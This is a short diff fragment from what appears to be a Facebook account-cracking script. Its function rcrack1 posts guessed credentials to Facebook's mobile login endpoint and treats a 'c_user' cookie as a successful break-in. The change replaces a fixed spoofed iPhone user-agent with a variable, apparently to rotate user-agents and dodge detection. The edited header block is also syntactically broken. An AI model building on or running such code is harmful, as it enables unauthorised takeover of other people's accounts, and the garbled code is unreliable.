@@ -244,8 +244,8 @@ def rcrack1(uid,pwx,tl):
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B202 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/11.1.2;FBSS/3;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5;FBRV/105295260]'
-	   'viewport-width': '980',}		     
+           'user-agent':pro}
+	   'viewport-width': '980',		     
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
